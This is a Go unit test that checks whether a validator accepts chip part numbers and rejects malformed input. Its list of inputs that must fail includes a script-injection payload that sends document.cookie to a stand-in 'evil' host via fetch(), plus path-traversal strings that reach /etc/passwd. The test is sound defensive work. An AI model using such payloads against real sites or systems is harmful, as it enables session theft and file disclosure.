// Copyright 2026 Arun Gopalakrishnan and contributors. Licensed under Apache-2.0. See LICENSE.

package ticompliance

import "testing"

func TestValidateOPN(t *testing.T) {
	good := []string{"TUSB320RWBR", "TPS54360BDDA", "LM317-N", "opn.1", "A/B"}
	for _, g := range good {
		if err := ValidateOPN(g); err != nil {
			t.Errorf("ValidateOPN(%q) = %v, want nil", g, err)
		}
	}
	// injection + traversal payloads must be rejected fail-closed.
	bad := []string{
		"",
		"X');fetch('https://evil/?c='+document.cookie);('",
		"../../etc/passwd",
		"a/../b",
		"has space",
		"quote'inside",
	}
	for _, b := range bad {
		if err := ValidateOPN(b); err == nil {
			t.Errorf("ValidateOPN(%q) = nil, want error (injection/traversal must fail closed)", b)
		}
	}
}
